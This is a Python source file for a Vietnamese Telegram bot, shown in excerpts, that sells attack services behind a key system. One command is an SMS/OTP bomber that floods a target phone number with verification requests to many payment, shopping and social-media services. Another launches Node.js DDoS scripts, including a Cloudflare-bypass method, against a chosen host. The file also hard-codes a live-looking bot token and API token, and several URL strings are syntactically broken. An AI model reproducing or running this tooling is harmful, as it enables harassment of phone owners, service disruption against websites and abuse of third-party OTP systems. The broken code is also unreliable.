...
bot_token = '6372497027:AAF-QQkabXcrjN-daBfAImHnprdqMeGNCNw'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -4094999588
...
def laykey(message):
    ...
    try:
        response = requests.get(f'https://web1s.com/api?token=baa8c675-56dd-4228-94aa-1d7faeac0b3c&url=https://votruongsongioithieu.000webhostapp.com/?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /laykey"
    except requests.exceptions.RequestException as e:
        url_key = "FLấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /laykey"
    
    text = f'''
- Cảm Ơn Bạn Đã laykey -
...
def key(message):
    ...
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhập Key Thành Công Sử Dụng Lênh    /menu Để Xem Các Lệnh')
    else:
...
def attack_command(message):
    ...
    blocked_numbers = ['113', '114', '115', '198', '911', '0377293567']
    ...
    # Gửi dữ liệu tới api
    url = f"{https://api.zalopay.vn/v2/account/phone/status}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api.zalopay.vn/v2/account/otp}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://micro-services.vntrip.vn/core-user-service/verification/request/phone}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://products.popsww.com/api/v5/auths/register}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN}&phone={phone_number}"
    response = requests.get(url)
    url = f"{http://m.tv360.vn/public/v1/auth/get-otp-login}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://latte.lozi.vn/v1.2/auth/register/phone/initial}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://fptshop.com.vn/api-data/loyalty/Home/Verification}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api.vayvnd.vn/v1/users/password-reset}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api.tamo.vn/web/public/client/phone/sms-code-ts}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api.senmo.vn/api/user/send-one-time-password}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://www.instagram.com/accounts/account_recovery_send_ajax/}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://tiki.vn/api/v2/customers/otp_codes}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://tiki.vn/api/v2/customers/otp_codes}&phone={phone_number}"
    response = requests.get(url)
    url = f"{https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone}&phone={phone_number}"
    response = requests.get(url)
...
def attack_command(message):
    ...
    if method in ['TLS', 'GOD', 'CF-BYPASS']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLSPHI.js", host, "90", "64", "5"]
            duration = 90
        elif method == 'GOD':
            command = ["node", "Method-1.js", host, "45", "64", "3"]
            duration = 45
        elif method == 'CF-BYPASS':
            command = ["node", "CF-C.js", host, "90", "64", "5", "proxy.txt"]
            duration = 90
...
def send_admin_link(message):
    bot.reply_to(message, "Tele https://t.me/+lsFFx4DvRjw0ZmY1")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass
...
def invalid_command(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /menu để xem danh sách lệnh.')
